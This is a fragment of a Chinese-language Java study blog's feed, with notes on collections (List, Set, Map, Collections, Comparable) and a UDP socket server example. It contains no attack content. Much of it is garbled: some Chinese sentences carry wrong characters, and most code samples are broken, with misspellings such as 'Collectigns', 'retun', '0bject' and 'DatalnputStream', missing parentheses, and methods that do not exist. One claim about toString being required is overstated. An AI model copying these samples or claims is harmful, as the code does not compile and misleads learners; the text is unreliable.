id="Set接口"><a href="#Set接口" class="headerlink" title="Set接口"></a>Set接口</h4><p>​    无序，不允许重复</p><p>实现类:</p><p>​    TreeSet    HashSet</p><h4 id="List接口"><a href="#List接口" class="headerlink" title="List接口"></a>List接口</h4><p>​        有序，允许重复</p><p>​    实现类:</p><p>​        ArrayList   LinkedList</p><h4 id="Map接口"><a href="#Map接口" class="headerlink" title="Map接口"></a>Map接口</h4><p>定义:</p><p>​    既保存数据本身,也保存数据的主键的一种接口</p><p>实现类:</p><p>​    HahsMap  TreeMap</p><p>hashCode() 和 equals()方法（参见文章）</p><h3 id="Collections类"><a href="#Collections类" class="headerlink" title="Collections类"></a>Collections类</h3><p>​    该类提供了对Collection接口实现类的排序，倒置、查找等功能</p><h3 id="Comparable接口"><a href="#Comparable接口" class="headerlink" title="Comparable接口"></a>Comparable接口</h3><p>​    通过该接口的方法可以制订出对象之间比较的标准</p><p>​    凡是需要进行对象的比较排序的场合均可以考虑实现该接口</p><h3 id="ltefator接口"><a href="#ltefator接口" class="headerlink" title="ltefator接口"></a>ltefator接口</h3><p>​    利用该接口提供的方法我们可以遍历所有容器中的元素</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第一部分：基础知识&quot;&gt;&lt;a href=&quot;#第一部分：基础知识&quot; class=&quot;headerlink&quot; title=&quot;第一部分：基础知识&quot;&gt;&lt;/a&gt;第一部分：基础知识&lt;/h1&gt;&lt;h1 id=&quot;第二部分-面向对象&quot;&gt;&lt;a href=&quot;#第二部分-面向对象&quot; class</summary>
      
    
    
    
    <category term="Java" scheme="http://example.com/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Java 11网络编程</title>
    <link href="http://example.com/2021/04/21/Java-11%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <id>http://example.com/2021/04/21/Java-11%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</id>
    <published>2021-04-21T11:29:42.000Z</published>
    <updated>2021-04-21T12:32:00.042Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网络程序概念-没搞懂再说吧"><a href="#网络程序概念-没搞懂再说吧" class="headerlink" title="网络程序概念(没搞懂再说吧)"></a>网络程序概念(没搞懂再说吧)</h1><ul><li>网络程序<ul><li>能够<strong>接受另一台计算机发送过来的数据</strong>或者能够<strong>向另一台计算机发送数据</strong>的程序叫做网络程序（一个程序给另一个程序发数据）</li></ul></li></ul><p>一个网络程序对应一个端口号，这个词叫做绑定</p><ul><li>套接字(socket)的引入<ul><li>为了能够方便的开发网络应用软件。由美国伯克利人学在Unix上推出了一种应用序访问通信协议的攥作系统调用socket(套接字)socket的出现,使留序可阀方便地访间TCP/IP,从而开发各种阴络应用的程序</li><li>随着Unix的应用抽广,套接字在编写网络软件中得到了极大的普及。后来，套接字又被进了Windows等操作系统中Java语言也期入了套接字编模型.</li></ul></li></ul><h2 id="基于UDP的socket编程步骤"><a href="#基于UDP的socket编程步骤" class="headerlink" title="基于UDP的socket编程步骤"></a>基于UDP的socket编程步骤</h2><ul><li><p>1.定义码头</p><ul><li>即：<strong>定义一个DatagramSocket对象ds</strong></li></ul></li><li><p>2.定义可以用来接受或发送数据的集装箱</p><ul><li><strong>定义DatagramPacket对象dp</strong></li></ul></li><li><p>3.在码头上用集装箱接受对方发送过来的数据**(ds.receive(dp);)**</p><p>​    或者在码头上把集装箱中的数据发送给对方**(ds.send(dp))**</p></li><li><p>4.关闭码头**(ds.close())**</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//服务端</span></span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestUDPServer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//定义码头</span></span><br><span class="line">        DatagramSocket ds = <span class="keyword">new</span> DatagramSocket(<span class="number">5678</span>);<span class="comment">//5678表示该码头占用的是567B这个编号，因为一台计算机可以有多个码头接收多个数据，这些码头用不同的编号来表示，一台计算机可以有多个码头接收多个数据，这些码头用不同的编号来表示，</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//定义可以用来接受数据的集装箱</span></span><br><span class="line">        <span class="keyword">byte</span> buf[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        DatagramPacket dp = <span class="keyword">new</span> DatagramPacket(buf, buf.length);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//在码头上用集装箱接受对方发送过来的数据</span></span><br><span class="line">              ds.receive(dp); <span class="comment">//注意:本语句执行完毕就意味着，dp数据</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment">//从集装箱中取出对方发送过来的数据</span></span><br><span class="line">ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream() DataInputStream dis = <span class="keyword">new</span> DatalnputStream(bais);</span><br><span class="line">System.out.println(dis.readLong());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">            ds.close(); <span class="comment">//关闭码头</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网络程序概念-没搞懂再说吧&quot;&gt;&lt;a href=&quot;#网络程序概念-没搞懂再说吧&quot; class=&quot;headerlink&quot; title=&quot;网络程序概念(没搞懂再说吧)&quot;&gt;&lt;/a&gt;网络程序概念(没搞懂再说吧)&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;网络程序&lt;ul&gt;
&lt;li&gt;能够&lt;st</summary>
      
    
    
    
    <category term="Java" scheme="http://example.com/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Java 10容器</title>
    <link href="http://example.com/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/"/>
    <id>http://example.com/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/</id>
    <published>2021-04-20T13:45:30.000Z</published>
    <updated>2021-04-21T11:17:26.442Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是容器"><a href="#什么是容器" class="headerlink" title="什么是容器"></a>什么是容器</h1><p><strong>有一种类专门用于存放其他类对象，这个类叫集合或者容器</strong></p><h1 id="为什么需要容器"><a href="#为什么需要容器" class="headerlink" title="为什么需要容器"></a>为什么需要容器</h1><ul><li><p>数组存在两个缺陷</p><ul><li>数组长度难以扩充</li><li>数组中元素类型必须相同</li></ul></li><li><p>容器可以弥补数组的这两个缺陷</p></li></ul><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A[] arr = <span class="keyword">new</span> A[<span class="number">10</span>];</span><br></pre></td></tr></table></figure><p>​    表示分配了一个数组，数组的每个元素都是A类对象的一个引用，但是如果想扩充数组的长度，比如希望数组的长度变成15，我们是不能直接在原数组内存的后面追加内存的，必须得另外分配长度为15的内存空间，然后利用System.arraycopy()方法来把原数组的内容拷贝到新内存中，很明显，这即耗时。又耗内存!</p><p>​    所以<strong>一旦数组内存己分配，你想改变数组的长度，效率就会变的很低</strong></p><h1 id="容器与现实的对应关系"><a href="#容器与现实的对应关系" class="headerlink" title="容器与现实的对应关系"></a>容器与现实的对应关系</h1><ul><li>集合就是将若干用途、性质相同或相近的“数据”组合而成一个整体。</li><li>数学上，集合类型可以归纳为三种:</li><li>集( Set)<ul><li><strong>Set集合中不区分元素的顺序，不允许出现重复元素</strong></li></ul></li><li>列表(List)<ul><li>注意List不表示链表的意思，而是表示线性结构</li><li><strong>List集合区分元素的顺序，且允许包含重复元素</strong></li></ul></li><li>映射(Map)<ul><li><strong>映射中保存成对的“键-值”(Key-Value〉信息，映射中不能包含重复的键，每个键最多只能映射一个值</strong></li></ul></li><li>Java设计了三个接口来对应数学上的三种集合类型，这三个接口名字分别是Set List Map</li></ul><h1 id="List接口"><a href="#List接口" class="headerlink" title="List接口"></a>List接口</h1><ul><li>List接口是<strong>Collection的子接口</strong>，实现List接口的容器类中的元素是有顺序的，而且可以重复。</li><li>List容器中的元素都对应一个整数型的序号记载其在容器中的位置，可以根据序号存取容器中的元素。</li><li>J2SDK所提供的List容器类有ArrayList，LinkedList等。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">object <span class="title">get</span> <span class="params">(<span class="keyword">int</span> index)</span></span>;</span><br><span class="line"><span class="function">object <span class="title">set</span> <span class="params">(<span class="keyword">int</span> index,object element)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, object element)</span></span>;</span><br><span class="line"><span class="function">object <span class="title">remove</span> <span class="params">(<span class="keyword">int</span> index)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">indexof</span><span class="params">(object o)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lastIndexof</span><span class="params">(Object o)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestCollection_2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(Stringargs)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Collection c = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        c.add(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">        c.add(<span class="number">123</span>);</span><br><span class="line">        c.add(<span class="number">66.6</span>);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">________________________________</span><br><span class="line">    输出结果是:</span><br><span class="line">[zhangsan,<span class="number">123</span>,<span class="number">66.6</span>]</span><br></pre></td></tr></table></figure><p><strong>自己定义的类，要放进容器里，必须把toString重写</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestCollection</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    Collection c = <span class="keyword">new</span> LinkedList();</span><br><span class="line">        c.add(<span class="keyword">new</span> Student (<span class="string">&quot; zhangsan&quot;</span>, <span class="number">80</span>));</span><br><span class="line">        c.add(<span class="number">66.6</span>);</span><br><span class="line">    System.out.println(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name,<span class="keyword">int</span> age)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果把toString方法注释掉了，则程序输出结果会有乱码</span></span><br><span class="line">    <span class="keyword">public</span> String toString</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">return</span> name +” ”+ age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>强烈建议：所有添加到Collection容器中的对象都应该重写父类 0bject 的 toString 方法</strong></p><h2 id="ArrayList-与-LinkedList-的比较"><a href="#ArrayList-与-LinkedList-的比较" class="headerlink" title="ArrayList 与 LinkedList 的比较"></a>ArrayList 与 LinkedList 的比较</h2><ul><li>ArrayList和LinkedList都实现了List接口中的方法，但两者内部实现不同</li><li>ArrayList底层采用数组完成，而LinkedList则是以一般的双向链表(double-linked list)完成，其内每个对象除了数据本身外，还有两个引用，分别指向前一个元素和后一个元素。</li><li>如果我们经常在List的开始处增加元素，或者在List中进行插入和删除操作，我们应该使用LinkedList，否则的话，使用ArrayList将更加快速。</li><li><strong>ArrayList存取速度快，插入删除慢</strong></li><li><strong>LinkedList存取速度慢，插入删除速度快</strong></li></ul><h2 id="Collections类"><a href="#Collections类" class="headerlink" title="Collections类"></a>Collections类</h2><p>​    Collection接口的实现类，如ArrayList . LinkedList本身并没有提供排序，倒置，查找等方法，这些方法是由Collections类来实现的，该类有很多public static方法，可以直接对Collection接口的实现类进行操作</p><h3 id="Collections类常用算法"><a href="#Collections类常用算法" class="headerlink" title="Collections类常用算法"></a>Collections类常用算法</h3><p>类java.util.collections提供了一些静态方法实现了基于List容器的一些常用算法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(List)</span>    对List容器内的元素排序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shuffle</span><span class="params">(List)</span> 对List容器内的对象进行随机排列</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(List)</span> 对List容器内的对象进行逆续排列</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fill</span><span class="params">(List, object)</span></span></span><br><span class="line"><span class="function">  用一个特定的对象重写整个List容器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy</span><span class="params">(List dest,List src)</span></span></span><br><span class="line"><span class="function">  将src List容器内容拷贝到dest List容器</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binarysearch</span><span class="params">(List, object)</span></span></span><br><span class="line"><span class="function">  对于顺序的List容器，采用折半查找的方法查找特定对象</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestCollections</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        List lt = <span class="keyword">new</span> LinkedList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span> ;++i)</span><br><span class="line">        &#123;</span><br><span class="line">        lt.add(<span class="string">&quot;a&quot;</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println (lt);</span><br><span class="line">        Collectigns.shuffle(lt);</span><br><span class="line">            <span class="comment">//记住LinkedList中是没有shuffle方法的，因此丢要通过Collections类的相关方法来实现</span></span><br><span class="line">        System.out.println(lt);</span><br><span class="line">        Collections.sot(lt);</span><br><span class="line">        <span class="comment">//默认升序排序，要降序很简单，先调用Collections.sort();再调用Collections.reverse()</span></span><br><span class="line">        </span><br><span class="line">        System.out.printlIn(lt);</span><br><span class="line">        Collections.reverse(lt); <span class="comment">//倒置</span></span><br><span class="line">        System.out.println(<span class="string">&quot;倒置之后: &quot;</span> + lt);</span><br><span class="line">        System.out.println(Collections.binarySearch(lt,<span class="string">&quot;a5&quot;</span>));</span><br><span class="line">        <span class="comment">//因为lt默认不是升序排序的，所以调用Collections.binarySearch()方法是不会成功的      </span></span><br><span class="line">        Collections.sort(lt);</span><br><span class="line">        System.out.println(<span class="string">&quot;重新排序之后: &quot;</span> + lt);</span><br><span class="line">        System.out.println(Collections.binarySearch(lt, <span class="string">&quot;a5&quot;</span>));</span><br><span class="line">        <span class="comment">//记住，使用binarySearch()方法的前提是该容器已升序排序</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Collections-fill-用法"><a href="#Collections-fill-用法" class="headerlink" title="Collections.fill()用法"></a>Collections.fill()用法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">List lt = <span class="keyword">new</span> LinkedList(); <span class="comment">//7行</span></span><br><span class="line">lt.add(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">lt.add(<span class="string">&quot;222&quot;</span>);</span><br><span class="line">lt.add(<span class="string">&quot;333&quot;</span>);</span><br><span class="line">System.out.printIn(lt);</span><br><span class="line">Collections.fill(lt,<span class="string">&quot;888&quot;</span>);</span><br><span class="line">System.out.println(lt);</span><br><span class="line">___________________________________</span><br><span class="line">    [<span class="number">111</span>,<span class="number">222</span>,<span class="number">333</span>]</span><br><span class="line">    [<span class="number">888</span>,<span class="number">888</span>,<span class="number">888</span>]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.uti1.*;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Comparable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span> <span class="params">(<span class="keyword">int</span> id, String name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @0verride</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> id + <span class="string">&quot;&quot;</span> + name; <span class="comment">//1000张三</span></span><br><span class="line">        <span class="comment">//System.out.println();</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @0verride</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">colpareTo</span><span class="params">(0bject o)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Student st = (Student)o;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.id == st.id)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.id &gt; st.id)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestList</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        List L= <span class="keyword">new</span> ArrayList ();</span><br><span class="line">        L.add(<span class="keyword">new</span> Student(<span class="number">1000</span>,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        L.add(<span class="keyword">new</span> Student(<span class="number">1003</span>,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        L.add(<span class="keyword">new</span> Student(<span class="number">1002</span>,<span class="string">&quot;王五&quot;</span>);</span><br><span class="line">        L.add(<span class="keyword">new</span> Student(<span class="number">1001</span>,<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        Collections.sort(L);</span><br><span class="line">              </span><br><span class="line">        System.out.println(L);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Comparable接口"><a href="#Comparable接口" class="headerlink" title="Comparable接口"></a>Comparable接口</h2><h4 id="为何要使用Comparable接口"><a href="#为何要使用Comparable接口" class="headerlink" title="为何要使用Comparable接口"></a>为何要使用Comparable接口</h4><ul><li>基本类型数据和String类型数据，它们彼此的比较标准Java语言本身已经提供好了</li><li>用户自定义类对象之间比较的标准Java语言本身是没有提供的</li><li>所以<strong>如果一个容器中含有用户自定义类型的数据，并且我们需要对容器中元素进行排序，或查找某一元素时，我们就必须得制定容器中元素与元素之间比较的标准</strong></li><li>凡是需要进行对象比较/排序的场合均可考虑实现Comparable接口</li></ul><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.urtil.Collections;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果把implements Comparable注释掉了，则程序编译时没有错误，但运行时会报错</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Comparable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(<span class="keyword">int</span> id, String name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line"><span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        retun <span class="string">&quot;id:&quot;</span> + id + <span class="string">&quot;,name:&quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Object o)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Person p= (Person)o;</span><br><span class="line">        retun <span class="keyword">this</span>.id - p.id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestComparableQuestion</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">         ArrayList c = <span class="keyword">new</span> ArrayList();</span><br><span class="line">     c.add(<span class="keyword">new</span> Person(<span class="number">1000</span>, <span class="string">&quot;zhangsan&quot;</span>));</span><br><span class="line">         c.add(<span class="keyword">new</span> Person(<span class="number">1002</span>, <span class="string">&quot;wangwu&quot;</span>));</span><br><span class="line">         java.util.Collections.sort(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Comparabel接口介绍"><a href="#Comparabel接口介绍" class="headerlink" title="Comparabel接口介绍"></a>Comparabel接口介绍</h3><ul><li><p>问题：上面的算法根据什么确定容器中对象的”大小”顺序?</p></li><li><p>所有可以”排序”的类都实现了java. lang.Comparable接口,Comparable接口中只有一个方法</p><ul><li>public int compareTo(Object obj);<ul><li>该方法<ul><li>返回 0 表示 this == obj</li><li>返回正数表示 this &gt; obj</li><li>返回负数表示 this &lt; obj</li></ul></li></ul></li></ul></li><li><p>这个数值位置固定，值可以重复</p></li><li><p>实现了Comparable接口的类通过实现comparaTo方法从而确定该类对象的排序方式。</p></li></ul><h1 id="Set接口介绍"><a href="#Set接口介绍" class="headerlink" title="Set接口介绍"></a>Set接口介绍</h1><ul><li>Set接口是Collection的子接口，Set接口没有提供额外的方法，但实现Set接口的容器类中的元素是没有有顺序的，而且不可以重复。</li><li>Set容器可以与数学中“集合”的概念相对应。</li><li>J2SDK API中所提供的Set容器类有HashSet，TreeSet等。</li></ul><h2 